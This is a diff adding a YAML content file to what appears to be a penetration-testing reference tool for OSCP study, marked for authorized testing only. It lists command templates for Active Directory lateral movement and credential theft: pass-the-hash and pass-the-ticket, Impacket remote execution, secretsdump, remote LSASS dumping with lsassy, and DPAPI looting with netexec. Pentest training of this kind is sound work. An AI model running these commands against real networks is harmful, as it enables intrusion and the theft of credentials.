@@ -1,0 +1,293 @@
+# Cephalo content — AD lateral movement + post-access cred theft (AD-5).
+# Authorized testing only. Templates double-quoted; existing registry vars only.
+sections:
+  - id: ad.p10.lateral2
+    title: AD Lateral Movement (ticket & exec)
+    os: ad
+    phase: lateral-movement
+    order: 122
+    description: Overpass-the-Hash, Pass-the-Ticket, and the full Impacket exec spread.
+    techniques: [ad.lateral.opth, ad.lateral.ptt, ad.lateral.exec-methods]
+    packs: [oscp]
+  - id: ad.p10.postex
+    title: AD Post-access Credential Theft
+    os: ad
+    phase: post-exploitation
+    order: 128
+    description: Dump SAM/LSA/NTDS, parse LSASS, and loot DPAPI once you have a host.
+    techniques: [ad.lateral.secretsdump-local, ad.lateral.credtheft]
+    packs: [oscp]
+
+techniques:
+  - id: ad.lateral.opth
+    title: Overpass-the-Hash / Pass-the-Key
+    os: [ad]
+    phase: lateral-movement
+    summary: Turn an NT hash or AES key into a Kerberos TGT, then use the ticket.
+    body: |
+      "Overpass-the-hash" (a.k.a. pass-the-key) requests a real TGT from the KDC
+      using only a credential's NT hash or AES key, sidestepping NTLM. Request the
+      TGT, point KRB5CCNAME at the .ccache, and authenticate with `-k -no-pass`.
+    commands: [ad.lateral.opth.nthash, ad.lateral.opth.aeskey, ad.lateral.opth.use]
+    tags: [overpass-the-hash, kerberos, pass-the-ticket]
+    services: [kerberos]
+    ports: [88]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.lateral.ptt
+    title: Pass-the-Ticket
+    os: [ad]
+    phase: lateral-movement
+    summary: Inject a captured/forged ticket (.kirbi/.ccache) into your session.
+    body: |
+      Convert a Windows `.kirbi` to an Impacket `.ccache` (or vice-versa), export
+      KRB5CCNAME, and every `-k -no-pass` tool wields the ticket.
+    commands: [ad.lateral.ptt.convert, ad.lateral.ptt.use]
+    tags: [pass-the-ticket, kerberos]
+    services: [kerberos]
+    ports: [88]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.lateral.exec-methods
+    title: Remote execution methods (Impacket spread)
+    os: [ad]
+    phase: lateral-movement
+    summary: smbexec / atexec / dcomexec / winrs / RDP-PtH beyond psexec & wmiexec.
+    body: |
+      Each tool trades stealth for reliability. All Impacket exec tools accept the
+      same auth forms as psexec (`-hashes`, `-k`), so PtH/PtT apply throughout.
+    commands:
+      - ad.lateral.exec.smbexec
+      - ad.lateral.exec.atexec
+      - ad.lateral.exec.dcomexec
+      - ad.lateral.exec.winrs
+      - ad.lateral.exec.rdp
+    tags: [lateral-movement, impacket, pass-the-hash]
+    services: [smb, rpc]
+    archetypeBand: high
+    references: [ref.impacket, ref.lolbas]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.lateral.psexec, ad.lateral.wmiexec]
+
+  - id: ad.lateral.secretsdump-local
+    title: Dump SAM / LSA / cached secrets
+    os: [ad]
+    phase: post-exploitation
+    summary: secretsdump remotely or offline from saved hives.
+    body: |
+      With local-admin access, secretsdump pulls the local SAM, LSA secrets and
+      domain cached creds (DCC2) in one shot — remotely over the wire, or offline
+      from `reg save` hives. Feed the NT hashes back into the PtH lateral cards.
+    commands: [ad.lateral.secrets.remote, ad.lateral.secrets.offline]
+    tags: [credential-access, pass-the-hash]
+    services: [smb]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.lateral.psexec]
+
+  - id: ad.lateral.credtheft
+    title: LSASS & DPAPI credential theft
+    os: [ad]
+    phase: post-exploitation
+    summary: Parse LSASS remotely (lsassy) and loot DPAPI-protected secrets.
+    body: |
+      lsassy dumps + parses LSASS over the wire (methodology — on-host dumping is
+      version/EDR-sensitive). DPAPI protects browser/credential-manager secrets;
+      netexec's --dpapi recovers masterkeys + blobs you have rights to.
+    commands: [ad.lateral.credtheft.lsassy, ad.lateral.credtheft.dpapi]
+    tags: [credential-access, mimikatz]
+    archetypeBand: high
+    references: [ref.lsassy, ref.ms-dpapi, ref.mimikatz]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: ad.lateral.opth.nthash
+    title: TGT from NT hash (getTGT)
+    template: "impacket-getTGT -hashes :{{NTHASH}} {{DOMAIN}}/{{USER}} -dc-ip {{DC_IP}}"
+    tool: impacket
+    description: Request a TGT using the NT hash; writes {{USER}}.ccache.
+    os: [ad]
+    phase: lateral-movement
+    tags: [overpass-the-hash, kerberos]
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
+  - id: ad.lateral.opth.aeskey
+    title: TGT from AES key (getTGT)
+    template: "impacket-getTGT -aesKey {{AESKEY}} {{DOMAIN}}/{{USER}} -dc-ip {{DC_IP}}"
+    tool: impacket
+    description: Pass-the-Key — request a TGT from the AES256 key (quieter than RC4).
+    os: [ad]
+    phase: lateral-movement
+    tags: [overpass-the-hash, kerberos]
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
+  - id: ad.lateral.opth.use
+    title: Wield the TGT
+    template: "export KRB5CCNAME={{USER}}.ccache && impacket-wmiexec -k -no-pass {{DOMAIN}}/{{USER}}@{{TARGET}}"
+    tool: impacket
+    description: Point KRB5CCNAME at the ticket and authenticate with Kerberos.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-ticket, kerberos]
+    notes:
+      - "Use the FQDN for TARGET with Kerberos — SPNs are name-based, not IP-based."
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.lateral.ptt.convert
+    title: Convert .kirbi ↔ .ccache
+    template: "impacket-ticketConverter ticket.kirbi ticket.ccache"
+    tool: impacket
+    description: Convert a Rubeus/mimikatz .kirbi to an Impacket .ccache.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-ticket, kerberos]
+    confidence: verified
+    references: [ref.impacket]
+    danger: low
+    packs: [oscp]
+  - id: ad.lateral.ptt.use
+    title: Inject + verify ticket
+    template: "export KRB5CCNAME=ticket.ccache && klist"
+    description: Load the ticket into the environment and confirm it with klist.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-ticket, kerberos]
+    confidence: verified
+    references: [ref.impacket]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.lateral.exec.smbexec
+    title: smbexec (semi-interactive, no binary)
+    template: "impacket-smbexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+    tool: impacket
+    description: Service-less shell via SMB + a temporary service per command.
+    os: [ad]
+    phase: lateral-movement
+    tags: [lateral-movement, impacket]
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
+  - id: ad.lateral.exec.atexec
+    title: atexec (scheduled task)
+    template: "impacket-atexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}} whoami"
+    tool: impacket
+    description: Run a single command via the Task Scheduler.
+    os: [ad]
+    phase: lateral-movement
+    tags: [lateral-movement, impacket]
+    confidence: verified
+    references: [ref.impacket]
+    danger: medium
+    packs: [oscp]
+  - id: ad.lateral.exec.dcomexec
+    title: dcomexec (DCOM)
+    template: "impacket-dcomexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+    tool: impacket
+    description: Execute via MMC20/ShellWindows DCOM objects.
+    os: [ad]
+    phase: lateral-movement
+    tags: [lateral-movement, impacket]
+    confidence: verified
+    references: [ref.impacket]
+    danger: medium
+    packs: [oscp]
+  - id: ad.lateral.exec.winrs
+    title: winrs (native WinRM)
+    template: "winrs -r:{{TARGET}} -u:{{USER}} -p:{{PASS}} cmd"
+    shell: cmd
+    description: Native Windows remote shell over WinRM (no tooling on-host).
+    os: [ad]
+    phase: lateral-movement
+    tags: [lateral-movement, winrm]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: medium
+    packs: [oscp]
+  - id: ad.lateral.exec.rdp
+    title: RDP Pass-the-Hash (xfreerdp)
+    template: "xfreerdp /v:{{TARGET}} /u:{{USER}} /pth:{{NTHASH}}"
+    tool: xfreerdp
+    description: RDP with an NT hash (requires Restricted Admin mode on the target).
+    os: [ad]
+    phase: lateral-movement
+    tags: [lateral-movement, pass-the-hash, rdp]
+    notes:
+      - "Needs Restricted Admin mode enabled on the target (DisableRestrictedAdmin=0)."
+    confidence: verified
+    references: [ref.adsecurity]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.lateral.secrets.remote
+    title: secretsdump (remote)
+    template: "impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+    tool: impacket
+    description: Dump SAM + LSA secrets + cached domain creds over the wire.
+    os: [ad]
+    phase: post-exploitation
+    tags: [credential-access, pass-the-hash]
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
+  - id: ad.lateral.secrets.offline
+    title: secretsdump (offline hives)
+    template: "impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL"
+    tool: impacket
+    description: Extract hashes offline from reg-saved SAM/SYSTEM/SECURITY hives.
+    os: [ad]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.impacket]
+    danger: medium
+    packs: [oscp]
+
+  - id: ad.lateral.credtheft.lsassy
+    title: Remote LSASS dump (lsassy)
+    template: "lsassy -u '{{USER}}' -p '{{PASS}}' {{TARGET}}"
+    tool: lsassy
+    description: Dump + parse LSASS over the wire to recover logged-on credentials.
+    os: [ad]
+    phase: post-exploitation
+    tags: [credential-access, mimikatz]
+    notes:
+      - "On-host dumping (comsvcs/nanodump) is EDR-sensitive — parse offline where possible."
+    confidence: verified
+    references: [ref.lsassy]
+    danger: critical
+    packs: [oscp]
+  - id: ad.lateral.credtheft.dpapi
+    title: Loot DPAPI (netexec)
+    template: "netexec smb {{TARGET}} -u '{{USER}}' -p '{{PASS}}' --dpapi"
+    tool: netexec
+    description: Recover DPAPI masterkeys + browser/credential-manager secrets.
+    os: [ad]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.ms-dpapi, ref.netexec]
+    danger: high
+    packs: [oscp]
